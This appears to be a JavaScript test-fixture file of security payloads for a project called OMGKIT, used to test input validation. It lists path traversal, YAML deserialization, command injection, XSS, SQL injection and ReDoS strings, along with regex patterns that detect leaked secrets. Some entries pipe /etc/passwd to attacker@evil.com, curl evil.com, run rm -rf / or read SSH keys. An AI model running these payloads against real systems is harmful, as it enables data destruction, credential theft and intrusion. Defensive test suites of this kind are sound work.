/**
 * Security Payloads
 *
 * Test payloads for security testing - path traversal, injection, etc.
 */

/**
 * Path traversal attack payloads
 */
export const pathTraversalPayloads = [
  // Basic traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '../../../../../../../etc/passwd',
  '....//....//....//etc/passwd',
  '..../....//....//etc/passwd',

  // Encoded traversal
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows',

  // Double encoded
  '%252e%252e%252f%252e%252e%252f',
  '..%252f..%252f..%252f',

  // Unicode/UTF-8 encoded
  '..%c0%af..%c0%af..%c0%af',
  '..%ef%bc%8f..%ef%bc%8f',
  '%uff0e%uff0e%u2215',
  '%uff0e%uff0e%u2216',

  // Null byte injection
  '../../../etc/passwd%00',
  '../../../etc/passwd\x00.jpg',
  '..%00/..%00/etc/passwd',

  // Mixed case and variations
  '..\\..\\..\\',
  '..././..././',
  '.../.../.../',
  'skill/../../secrets.txt',
  'agents/../../../etc/shadow',

  // Path normalization bypass
  '/var/log/../../etc/passwd',
  './../../../../etc/passwd',
  'foo/../../../etc/passwd',

  // Windows-specific
  '..\\..\\..\\windows\\win.ini',
  '....\\\\....\\\\',
  'C:\\Windows\\System32\\config\\SAM',
  '\\\\server\\share\\..\\..\\',
];

/**
 * YAML injection attack payloads
 */
export const yamlInjectionPayloads = [
  // Python object instantiation
  '!!python/object/apply:os.system ["rm -rf /"]',
  '!!python/object:__main__.DangerousClass',
  '!!python/object/new:os.system ["id"]',
  '!!python/name:os.system',

  // JavaScript eval
  '!!js/eval "process.exit(1)"',
  '!!js/undefined',
  '!!js/function "function(){return process.env}"',

  // Ruby object instantiation
  '!ruby/object:Gem::Requirement',
  '!ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection',

  // Billion laughs / entity expansion
  '&a1 ["lol","lol","lol"]',
  '&a2 [*a1,*a1,*a1]',
  '&a3 [*a2,*a2,*a2]',

  // Anchor/alias abuse
  '&anchor {"key": "value"}',
  '*anchor',
  '<<: *anchor',

  // Binary data
  '!!binary |\\n R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==',

  // Timestamp manipulation
  '!!timestamp 2001-12-15T02:59:43.1Z',

  // Merge key attacks
  '<<: {"admin": true}',

  // Type coercion
  '!!str 123',
  '!!int "not a number"',
  '!!float "NaN"',
];

/**
 * Command injection attack payloads
 */
export const commandInjectionPayloads = [
  // Semicolon injection
  '; rm -rf /',
  '; cat /etc/passwd',
  '; id',
  '; whoami',

  // Pipe injection
  '| cat /etc/passwd',
  '| rm -rf /',
  '| id > /tmp/pwned',

  // Command substitution
  '$(rm -rf /)',
  '$(cat /etc/passwd)',
  '$(id)',
  '`rm -rf /`',
  '`cat /etc/passwd`',
  '`id`',

  // Logical operators
  '&& rm -rf /',
  '|| cat /etc/passwd',
  '& rm -rf / &',

  // Newline injection
  '\n rm -rf /',
  '\r\n cat /etc/passwd',
  '%0a rm -rf /',
  '%0d%0a id',

  // Background execution
  '& ping -c 10 attacker.com &',

  // File redirection
  '> /tmp/pwned',
  '>> /etc/passwd',
  '< /etc/passwd',

  // Complex chains
  '; cat /etc/passwd | mail attacker@evil.com',
  '&& curl http://evil.com/$(whoami)',

  // Windows command injection
  '& dir',
  '| type C:\\Windows\\win.ini',
  '%COMSPEC% /c dir',
];

/**
 * Unicode and encoding attack payloads
 */
export const unicodePayloads = [
  // Zero-width characters
  'te\u200Bst', // Zero-width space
  'te\u200Cst', // Zero-width non-joiner
  'te\u200Dst', // Zero-width joiner
  'te\uFEFFst', // Zero-width no-break space (BOM)

  // Homoglyphs
  'tеst', // Cyrillic 'е' instead of Latin 'e'
  'tеѕt', // Multiple Cyrillic chars
  'аdmin', // Cyrillic 'а'

  // Right-to-left override
  'test\u202Efdp.exe', // RTL override
  '\u202E\u2066test\u2069\u202C',

  // Null byte
  'test\x00.txt',
  'test\u0000.txt',

  // Control characters
  'test\x01\x02\x03',
  'test\x7F', // DEL
  'test\x1B[31m', // ANSI escape

  // Combining characters
  'test\u0300\u0301\u0302', // Multiple combining accents
  'e\u0301', // é composed

  // Overlong UTF-8
  '\xC0\xAF', // Overlong /
  '\xE0\x80\xAF', // Overlong /

  // Special Unicode
  '\uD800', // Unpaired surrogate
  '\uDFFF', // Unpaired surrogate
  '\uFFFE', // Non-character
  '\uFFFF', // Non-character
];

/**
 * XSS attack payloads (for content validation)
 */
export const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<a href="javascript:alert(\'XSS\')">click</a>',
  '"><script>alert("XSS")</script>',
  '\'-alert("XSS")-\'',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert("XSS")}',
];

/**
 * SQL injection payloads (for data validation)
 */
export const sqlInjectionPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE users;--",
  "1; SELECT * FROM users",
  "' UNION SELECT * FROM passwords--",
  "admin'--",
  "1' AND '1'='1",
  "' OR 1=1--",
  "1; INSERT INTO users VALUES('attacker', 'password');--",
];

/**
 * Regex DoS payloads
 */
export const regexDosPayloads = [
  'a'.repeat(50) + '!',
  '(a+)+$'.repeat(20),
  '([a-zA-Z]+)*'.repeat(10),
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  Array(100).fill('a').join(''),
];

/**
 * Sensitive data patterns that should not appear in outputs
 */
export const sensitivePatterns = [
  /api[_-]?key\s*[:=]/i,
  /secret[_-]?key\s*[:=]/i,
  /password\s*[:=]/i,
  /auth[_-]?token\s*[:=]/i,
  /private[_-]?key\s*[:=]/i,
  /access[_-]?token\s*[:=]/i,
  /bearer\s+[a-zA-Z0-9._-]+/i,
  /sk-[a-zA-Z0-9]{32,}/,
  /ghp_[a-zA-Z0-9]{36}/,
  /gho_[a-zA-Z0-9]{36}/,
  /xox[baprs]-[a-zA-Z0-9-]+/,
  /-----BEGIN\s+(RSA|DSA|EC|OPENSSH)?\s*PRIVATE\sKEY-----/,
];

/**
 * File path attack payloads specific to OMGKIT
 */
export const omgkitPathPayloads = [
  // Skill path attacks
  'testing/../../../etc/passwd',
  'methodology/../../secrets',
  '../plugin/registry.yaml',
  'skill-name/../../../../../../etc/passwd',

  // Command path attacks
  'quality/../../../bin/sh',
  'dev/../../../../etc/shadow',

  // Agent path attacks
  '../../../home/user/.ssh/id_rsa',
  'planner/../../config.yaml',

  // Workflow path attacks
  'testing/../../../../../../tmp/evil',
];

export default {
  pathTraversalPayloads,
  yamlInjectionPayloads,
  commandInjectionPayloads,
  unicodePayloads,
  xssPayloads,
  sqlInjectionPayloads,
  regexDosPayloads,
  sensitivePatterns,
  omgkitPathPayloads,
};
